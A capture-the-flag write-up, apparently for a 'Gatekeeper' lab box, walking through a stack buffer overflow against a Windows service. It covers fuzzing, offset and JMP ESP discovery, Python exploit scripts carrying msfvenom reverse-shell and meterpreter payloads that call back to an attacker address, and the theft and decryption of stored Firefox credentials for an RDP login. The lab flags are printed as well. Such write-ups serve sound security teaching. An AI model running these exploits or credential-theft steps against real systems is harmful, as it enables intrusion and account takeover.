[Defeat the Gatekeeper and pass through the fire]

[Release the Gatekeeper] Target: 10.10.16.6

[Challenge 1] Locate and find the User Flag. => {H4lf_W4y_Th3r3}

    # nmap 10.10.16.6 -sV -sC -T 5 -p- -A --disable-arp-ping -Pn               

        Not shown: 65524 closed tcp ports (reset)
        PORT      STATE SERVICE            VERSION
        135/tcp   open  msrpc              Microsoft Windows RPC
        139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
        445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
        3389/tcp  open  ssl/ms-wbt-server?
        | ssl-cert: Subject: commonName=gatekeeper
        | Not valid before: 2023-07-18T03:20:43
        |_Not valid after:  2024-01-17T03:20:43
        |_ssl-date: 2023-07-19T03:34:26+00:00; 0s from scanner time.
        | rdp-ntlm-info: 
        |   Target_Name: GATEKEEPER
        |   NetBIOS_Domain_Name: GATEKEEPER
        |   NetBIOS_Computer_Name: GATEKEEPER
        |   DNS_Domain_Name: gatekeeper
        |   DNS_Computer_Name: gatekeeper
        |   Product_Version: 6.1.7601
        |_  System_Time: 2023-07-19T03:34:20+00:00
        31337/tcp open  Elite?
        | fingerprint-strings: 
        |   FourOhFourRequest: 
        |     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
        |     Hello
        ...
        |   SIPOptions: 
        |     Hello OPTIONS sip:nm SIP/2.0
        |     Hello Via: SIP/2.0/TCP nm;branch=foo
        |     Hello From: <sip:nm@nm>;tag=root
        |     Hello To: <sip:nm2@nm2>
        |     Hello Call-ID: 50000
        |     Hello CSeq: 42 OPTIONS
        |     Hello Max-Forwards: 70
        |     Hello Content-Length: 0
        |     Hello Contact: <sip:nm@nm>
        |     Hello Accept: application/sdp
        |     Hello
        |   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
        |_    Hello
        49152/tcp open  msrpc              Microsoft Windows RPC
        49153/tcp open  msrpc              Microsoft Windows RPC
        49154/tcp open  msrpc              Microsoft Windows RPC
        49160/tcp open  msrpc              Microsoft Windows RPC
        49161/tcp open  msrpc              Microsoft Windows RPC
        49164/tcp open  msrpc              Microsoft Windows RPC

        No exact OS matches for host (test conditions non-ideal).
        Network Distance: 2 hops
        Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

        Host script results:
        | smb2-security-mode: 
        |   210: 
        |_    Message signing enabled but not required
        | smb-os-discovery: 
        |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
        |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
        |   Computer name: gatekeeper
        |   NetBIOS computer name: GATEKEEPER\x00
        |   Workgroup: WORKGROUP\x00
        |_  System time: 2023-07-18T23:34:20-04:00
        | smb2-time: 
        |   date: 2023-07-19T03:34:20
        |_  start_date: 2023-07-19T03:20:42
        | smb-security-mode: 
        |   account_used: guest
        |   authentication_level: user
        |   challenge_response: supported
        |_  message_signing: disabled (dangerous, but default)
        |_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02428b482a5b (unknown)
        |_clock-skew: mean: 48m00s, deviation: 1h47m20s, median: 0s

    [Note] Look like we have something in port 31337. In hacker cultrure, 31337 is called advance port, it's usally used like a listener on the target machine

        # nc -nv 10.10.16.6 31337
        (UNKNOWN) [10.10.16.6] 31337 (?) open
            ls
            Hello ls!!!
            hello test
            Hello hello test!!!

        [>>] There it is =)) I think this is where we perform our BOF attack, but this is'nt enough, must find out the running file

            # smbclient -L //10.10.16.6 

                    Sharename       Type      Comment
                    ---------       ----      -------
                    ADMIN$          Disk      Remote Admin
                    C$              Disk      Default share
                    IPC$            IPC       Remote IPC
                    Users           Disk    

        [Note] I think this would be hard to find but guess what 
        
            # smbclient //10.10.16.6/Users -U guest              

                Password for [WORKGROUP\guest]: 
                Try "help" to get a list of possible commands.
                smb: \> ls
                .                                  DR        0  Fri May 15 09:57:08 2020
                ..                                 DR        0  Fri May 15 09:57:08 2020
                Default                           DHR        0  Tue Jul 14 15:07:31 2009
                desktop.ini                       AHS      174  Tue Jul 14 12:54:24 2009
                Share                               D        0  Fri May 15 09:58:07 2020

                                7863807 blocks of size 4096. 3859297 blocks available
                smb: \> cd Share
                smb: \Share\> ls
                .                                   D        0  Fri May 15 09:58:07 2020
                ..                                  D        0  Fri May 15 09:58:07 2020
                gatekeeper.exe                      A    13312  Mon Apr 20 13:27:17 2020

                                7863807 blocks of size 4096. 3884512 blocks available
                smb: \Share\> get gatekeeper.exe
                getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (12.1 KiloBytes/sec) (average 12.1 KiloBytes/sec)
                smb: \Share\> 

                [>>] I think we need to build a lab to analyse this

        [Note] I just finished setup my windows 10 machine with Immunity Debugger

            => nc -nv 192.168.101.28 31337
                (UNKNOWN) [192.168.101.28] 31337 (?) open
                test
                Hello test!!!

            [>>] Listening for connections.
                 Received connection from remote host.
                 Connection handed off to handler thread.
                 Bytes received: 5
                 Bytes sent: 14

        => [Step 1] Fuzzing

        [Note] I know, I know! My code is a little bit stupid but still a good one okay =))

            import subprocess
            import time

            buffer_boy = "A" * 100

            while True:
                print(f"Test: {len(buffer_boy)}")
                command = f'(echo "{str(buffer_boy)}" && echo "exit") | ncat -nv 192.168.101.28 31337'
                subprocess.call(command, shell=True)
                time.sleep(1)
                buffer_boy += "A" * 100

            [>>] python3 GateKeeper-Analyse.py

                Test: 100
                Ncat: Version 7.93 ( https://nmap.org/ncat )
                Ncat: Connected to 192.168.101.28:31337.
                Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!!!
                Bye!Ncat: 106 bytes sent, 114 bytes received in 0.12 seconds.
                Test: 200
                Ncat: Version 7.93 ( https://nmap.org/ncat )
                Ncat: Connected to 192.168.101.28:31337.

                [>>] Bytes received: 106
                     Bytes sent: 110
                     Client requested exit.
                     Received connection from remote host.
                     Connection handed off to handler thread.
                     Bytes received: 206
                     send failed: 10038

            [>>] EIP: 41414141 <=> AAAA

    [Step 2] Find the offset

        # msf-pattern_create -l 250

            Aa0Aa1Aa2Aa3Aa...9Ai0Ai1Ai2A

        # nc -nv 192.168.101.28 31337
          (UNKNOWN) [192.168.101.28] 31337 (?) open

          Aa0Aa1Aa2Aa3Aa...9Ai0Ai1Ai2A

        => EIP: 39654138

        # msf-pattern_offset -l 250 -q 39654138

            [*] Exact match at offset 146
        
        import socket
        import sys

        buffer_boy = "A" * 146 + "root"

        connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect.connect(('192.168.101.28', 31337))
        connect.send(buffer_boy)
        connect.close()

        [>>] EIP: 746F6F72
    
    [Step 3] Check badchar

        import socket
        import sys

        badchars = (
            b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
            b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
            b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
            b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
            b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
            b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
            b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
            b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
            b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
            b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
            b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
            b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
            b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
            b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
            b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
            b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
        )

        buffer_boy = b"A" * 146 + b"root" + badchars

        connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect.connect(('192.168.101.28', 31337))
        connect.send(buffer_boy)
        connect.close()

    [>>] Check ESP's dump, and I found that there is no badchar

        00B11A74  41 41 41 41 41 41 41 41  AAAAAAAA
        00B11A7C  41 41 72 6F 6F 74 01 02  AAroot
        00B11A84  03 04 05 06 07 08 09 00  ..
        00B11A8C  0B 0C 0D 0E 0F 10 11 12  ..
        00B11A94  13 14 15 16 17 18 19 1A  
        00B11A9C  1B 1C 1D 1E 1F 20 21 22   !"
        00B11AA4  23 24 25 26 27 28 29 2A  #$%&'()*
        00B11AAC  2B 2C 2D 2E 2F 30 31 32  +,-./012
        00B11AB4  33 34 35 36 37 38 39 3A  3456789:
        00B11ABC  3B 3C 3D 3E 3F 40 41 42  ;<=>?@AB
        00B11AC4  43 44 45 46 47 48 49 4A  CDEFGHIJ
        00B11ACC  4B 4C 4D 4E 4F 50 51 52  KLMNOPQR
        00B11AD4  53 54 55 56 57 58 59 5A  STUVWXYZ
        00B11ADC  5B 5C 5D 5E 5F 60 61 62  [\]^_`ab
        00B11AE4  63 64 65 66 67 68 69 6A  cdefghij
        00B11AEC  6B 6C 6D 6E 6F 70 71 72  klmnopqr
        00B11AF4  73 74 75 76 77 78 79 7A  stuvwxyz
        00B11AFC  7B 7C 7D 7E 7F 80 81 82  {|}~€‚
        00B11B04  83 84 85 86 87 88 89 8A  ƒ„…†‡ˆ‰Š
        00B11B0C  8B 8C 8D 8E 8F 90 91 92  ‹ŒŽ‘’
        00B11B14  93 94 95 96 97 98 99 9A  “”•–—˜™š
        00B11B1C  9B 9C 9D 9E 9F A0 A1 A2  ›œžŸ ¡¢
        00B11B24  A3 A4 A5 A6 A7 A8 A9 AA  £¤¥¦§¨©ª
        00B11B2C  AB AC AD AE AF B0 B1 B2  «¬­®¯°±²
        00B11B34  B3 B4 B5 B6 B7 B8 B9 BA  ³´µ¶·¸¹º
        00B11B3C  BB BC BD BE BF C0 C1 C2  »¼½¾¿ÀÁÂ
        00B11B44  C3 C4 C5 C6 C7 C8 C9 CA  ÃÄÅÆÇÈÉÊ
        00B11B4C  CB CC CD CE CF D0 D1 D2  ËÌÍÎÏÐÑÒ
        00B11B54  D3 D4 D5 D6 D7 D8 D9 DA  ÓÔÕÖ×ØÙÚ
        00B11B5C  DB DC DD DE DF E0 E1 E2  ÛÜÝÞßàáâ
        00B11B64  E3 E4 E5 E6 E7 E8 E9 EA  ãäåæçèéê
        00B11B6C  EB EC ED EE EF F0 F1 F2  ëìíîïðñò
        00B11B74  F3 F4 F5 F6 F7 F8 F9 FA  óôõö÷øùú
        00B11B7C  FB FC FD FE FF           ûüýþÿ

    [Step 4] Finding the Right Module

        # !mona modules
        
                => Message= 0x08040000 | 0x08048000 | 0x00008000 | False  | True    | False |  False   | False  | -1.0- [gatekeeper.exe] (C:\Users\Omnissiah\Desktop\gatekeeper.exe)

                +----------------------------------------------+
                |          Padding (n bytes)                   |
                +----------------------------------------------+
                |          Old EBP (4 bytes)                   |
                +----------------------------------------------+
                |          Return Address (EIP) (4 bytes)      |
                +----------------------------------------------+
                |          Buffer (overflowed data)            |
                +----------------------------------------------+
                |          ESP (points here)                   |
                +----------------------------------------------+

            => When an attacker successfully overwrites the return address (EIP) on the stack with the value FFE4 <=> JMP ESP
            
            [>>] The program will execute the jmp esp instruction during its normal flow, causing it to jump to the address stored in the ESP register

        # !mona find -s "\xff\xe4" -m gatekeeper.exe
 
            Address=080414C3
            Message=  0x080414c3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\Omnissiah\Desktop\gatekeeper.exe)

            Address=080416BF
            Message=  0x080416bf : "\xff\xe4" |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\Omnissiah\Desktop\gatekeeper.exe)

            [>>]    import socket

                    buffer_boy = b"A" * 146 + b"\xbf\x16\x04\x08"

                    connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    connect.connect(('192.168.101.28', 31337))
                    connect.send(buffer_boy + b"\r\n")
                    connect.close()

            [>>] EIP: 080416BF

[Final Step] Exploit

[+] Now we have enough information, let's exploit the target

    # msfvenom -p windows/shell_reverse_tcp LHOST=10.14.56.1 LPORT=1234 -f exe -f python -b "\x00\x0a" EXITFUNC=thread       
    
        [Note] Null Bytes (\x00) && Newline (\x0a) you should avoid them

        [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
        [-] No arch selected, selecting arch: x86 from the payload
        Found 12 compatible encoders
        Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
        x86/shikata_ga_nai succeeded with size 351 (iteration=0)
        x86/shikata_ga_nai chosen with final size 351
        Payload size: 351 bytes
        Final size of python file: 1745 bytes
        buf =  b""
        buf += b"\xdb\xc7\xba\xb8\x9e\x3d\xea\xd9\x74\x24\xf4\x58"
        buf += b"\x33\xc9\xb1\x52\x83\xc0\x04\x31\x50\x13\x03\xe8"
        ...
        buf += b"\x92\x93\x76\x2f\x1f\xfe\x88\x9a\x5c\x07\x0b\x2e"
        buf += b"\x1d\xfc\x13\x5b\x18\xb8\x93\xb0\x50\xd1\x71\xb6"
        buf += b"\xc7\xd2\x53"

        [>>]    import socket

                buf =  b""
                buf += b"\xdb\xc7\xba\xb8\x9e\x3d\xea\xd9\x74\x24\xf4\x58"
                buf += b"\xdb\xc7\xba\xb8\x9e\x3d\xea\xd9\x74\x24\xf4\x58"
                ...
                buf += b"\x92\x93\x76\x2f\x1f\xfe\x88\x9a\x5c\x07\x0b\x2e"
                buf += b"\x1d\xfc\x13\x5b\x18\xb8\x93\xb0\x50\xd1\x71\xb6"
                buf += b"\xc7\xd2\x53"

                buffer_boy = b"A" * 146 + b"\xbf\x16\x04\x08" + b"\x90" * 16 + buf

                connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                connect.connect(('10.10.16.6', 31337))
                connect.send(buffer_boy + b"\r\n")
                connect.close()

        [Note] x90 just a little space to avoid error, you can * 16 or * 32 ... any number you want

    # nc -lnvp 1234

        listening on [any] 1234 ...
        connect to [10.14.56.1] from (UNKNOWN) [10.10.16.6] 49202
        Microsoft Windows [Version 6.1.7601]
        Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

        C:\Users\natbat\Desktop>dir
        dir
        Volume in drive C has no label.
        Volume Serial Number is 3ABE-D44B

        Directory of C:\Users\natbat\Desktop

        05/14/2020  09:24 PM    <DIR>          .
        05/14/2020  09:24 PM    <DIR>          ..
        04/21/2020  05:00 PM             1,197 Firefox.lnk
        04/20/2020  01:27 AM            13,312 gatekeeper.exe
        04/21/2020  09:53 PM               135 gatekeeperstart.bat
        05/14/2020  09:43 PM               140 user.txt.txt
                    4 File(s)         14,784 bytes
                    2 Dir(s)  15,761,604,608 bytes free

        C:\Users\natbat\Desktop>type user.txt.txt
        type user.txt.txt
        {H4lf_W4y_Th3r3}

        The buffer overflow in this room is credited to Justin Steven and his 
        "dostackbufferoverflowgood" program.  Thank you!

[Challenge 2] Locate and find the Root Flag => {Th3_M4y0r_C0ngr4tul4t3s_U}

[+] In this case, we need a better shell since curl or wget can't be run in this machine

    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.14.56.1 LPORT=4321 -f exe -f python -b "\x00\x0a" EXITFUNC=thread

        buf =  b""
        buf += b"\xbd\x41\xb9\x41\x3b\xda\xda\xd9\x74\x24\xf4\x5b"
        buf += b"\x29\xc9\xb1\x5e\x31\x6b\x15\x83\xeb\xfc\x03\x6b"
        ...
        buf += b"\x18\x2e\x13\xb5\xb0\xf7\xf6\x74\xdd\x07\x2d\xba"
        buf += b"\xd8\x8b\xc7\x43\x1f\x93\xa2\x46\x5b\x13\x5f\x3b"
        buf += b"\xf4\xf6\x5f\xe8\xf5\xd2"

    import socket

    buf =  b""
    buf += b"\xbd\x41\xb9\x41\x3b\xda\xda\xd9\x74\x24\xf4\x5b"
    buf += b"\x29\xc9\xb1\x5e\x31\x6b\x15\x83\xeb\xfc\x03\x6b"
    ...
    buf += b"\x18\x2e\x13\xb5\xb0\xf7\xf6\x74\xdd\x07\x2d\xba"
    buf += b"\xd8\x8b\xc7\x43\x1f\x93\xa2\x46\x5b\x13\x5f\x3b"
    buf += b"\xf4\xf6\x5f\xe8\xf5\xd2"

    buffer_boy = b"A" * 146 + b"\xbf\x16\x04\x08" + b"\x90" * 16 + buf

    connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect.connect(('10.10.16.6', 31337))
    connect.send(buffer_boy + b"\r\n")
    connect.close()

    [>>] msf6 > use exploit/multi/handler
         [*] Using configured payload generic/shell_reverse_tcp
         
         msf6 exploit(multi/handler) > set LHOST 10.14.56.1
         LHOST => 10.14.56.1
         
         msf6 exploit(multi/handler) > set LPORT 4321
         LPORT => 4321
         
         msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
         payload => windows/meterpreter/reverse_tcp
         
         msf6 exploit(multi/handler) > run

         [*] Started reverse TCP handler on 10.14.56.1:4321 
         [*] Sending stage (175686 bytes) to 10.10.16.6
         [*] Meterpreter session 1 opened (10.14.56.1:4321 -> 10.10.16.6:49207) at 2023-07-19 17:07:01 +0800

         meterpreter > 

        ....

        msf6 post(multi/recon/local_exploit_suggester) > run

        [*] 10.10.16.6 - Collecting local exploits for x86/windows...
        [*] 10.10.16.6 - 186 exploit checks are being tried...
        [+] 10.10.16.6 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
        [+] 10.10.16.6 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
        [+] 10.10.16.6 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
        [+] 10.10.16.6 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
        [+] 10.10.16.6 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
        [+] 10.10.16.6 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
        [*] Running check method for exploit 41 / 41
        [*] 10.10.16.6 - Valid modules for session 1:
        ============================

        #   Name                                                           Potentially Vulnerable?  Check Result
        -   ----                                                           -----------------------  ------------
        1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
        2   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
        3   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
        4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
        5   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
        6   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
        ...

        => Yeah! I tried all of this but none of them worked

    [+] After stucking for hours, I look at the Desktop and think

        04/21/2020  05:00 PM             1,197 Firefox.lnk

        This must be a hint, there might be something in this, so I go to C:\Users\natbat\Appdata\Roaming\Mozilla\Firefox\Profiles and download all of its files and folders

    # grep -r "Password" ljfn812a.default-release        

        ljfn812a.default-release/logins.json:{"nextId":2,"logins":
        [{"id":1,"hostname":"https://creds.com",
        "httpRealm":null,"formSubmitURL":"",
        "usernameField":"",
        "passwordField":"",
        "encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECL2tyAh7wW+dBAh3qoYFOWUv1g==",
        "encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECIcug4ROmqhOBBgUMhyan8Y8Nia4wYvo6LUSNqu1z+OT8HA=",
        "guid":"{7ccdc063-ebe9-47ed-8989-0133460b4941}",
        "encType":1,"timeCreated":1587502931710,"timeLastUsed":1587502931710,
        "timePasswordChanged":1589510625802,"timesUsed":1}],
        "potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}

    => I need a tool to decrypt Firefox's Password (Link: https://github.com/unode/firefox_decrypt)

        # python3 firefox_decrypt.py ../ljfn812a.default-release
            
            2023-07-19 18:15:14,473 - WARNING - profile.ini not found in ../ljfn812a.default-release
            2023-07-19 18:15:14,473 - WARNING - Continuing and assuming '../ljfn812a.default-release' is a profile location

            Website:   https://creds.com
            Username: 'mayor'
            Password: '8CL7O1N78MdrCIsV'

    [!] Using remmina (just a RDP service) you can login using the credential we just found, there is the root.txt right in the mayor's Desktop
        => {Th3_M4y0r_C0ngr4tul4t3s_U}
